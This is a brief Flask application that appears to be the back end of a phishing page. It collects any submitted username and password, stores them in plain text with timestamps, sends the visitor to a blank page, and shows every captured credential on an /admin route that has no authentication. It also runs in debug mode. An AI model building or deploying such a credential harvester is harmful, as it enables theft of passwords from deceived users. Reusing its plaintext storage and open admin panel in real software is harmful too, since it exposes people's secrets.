from datetime import datetime
from flask import Flask, redirect, render_template, request, url_for

app = Flask(__name__)

submissions = []


@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "").strip()

        if username and password:
            submissions.append(
                {
                    "username": username,
                    "password": password,
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                }
            )
            # Redirects to the /blank route upon successful submission
            return redirect(url_for("blank"))

    return render_template("index.html")


@app.route("/blank")
def blank():
    return render_template("blank.html")


@app.route("/admin")
def admin():
    return render_template("admin.html", submissions=submissions)


if __name__ == "__main__":
    app.run(debug=True)